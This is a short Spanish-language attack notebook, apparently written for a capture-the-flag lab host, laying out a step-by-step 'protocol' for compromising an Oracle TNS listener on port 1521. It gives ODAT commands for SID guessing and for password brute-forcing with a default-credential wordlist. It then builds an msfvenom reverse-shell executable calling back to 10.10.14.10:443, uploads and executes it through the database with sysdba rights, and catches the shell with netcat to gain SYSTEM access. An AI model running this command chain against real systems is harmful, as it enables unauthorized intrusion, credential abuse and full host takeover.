# Ataque al puerto 1521 oracle_tns

Descripcion de reporte de nmap --> Oracle TNS listener 11.2.0.2.0 (unauthorized)


# Protocolo de Ataque al oracle_tns server

1. Usamos la herramienta de odat que la tengo guardada en /opt/saved_exploits

2. Intentamos conseguir un SID que obtenemos mediante la herramienta de odat

	# Proceso de Obtencion de el SID
	python3 odat.py sidguesser -s 10.10.10.82

3. Al conseguir el SID (ejemplo=XE) necesitamos hacer un ataque al este SID para poder tener acceso a esta base de datos
	
	#Necesitamos adecuar los espacios por barras en el PATH
	Path = /usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt
	Code to change the path = cat /usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt | tr ' ' '/' -> passwords.txt

	# Realizamos Ataque de Fuerza Bruta con el SID que hemos obtenido
	Code = python3 odat.py passwordguesser -s 10.10.10.82 -d XE --accounts-file passwords.txt
	Response -> [+] Accounts found on 10.10.10.82:1521/sid:XE: scott/tiger

	# Ganar acceso como admin al sistema
	[Creacion de archivo malicioso]
		Code = msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.10 LPORT=443 -f exe -o shell.exe

	[Subida de archivo malicioso]
		Code = python3 odat.py utlfile -s 10.10.10.82 -d XE -U "scott" -P "tiger" --putFile /Temp shell.exe shell.exe --sysdba

	[Ejecucion del archivo subido para ganar acceso al sistema]
		Code Terminal_1 = python3 odat.py externaltable -s 10.10.10.82 -d XE -U "scott" -P "tiger" --exec /Temp shell.exe --sysdba
		Code Terminal_2 = rlwrap nc -nlvp 443

	Y CHINPUM ESTAMOS DENTRO DEL SISTEMA COMO nt/authority
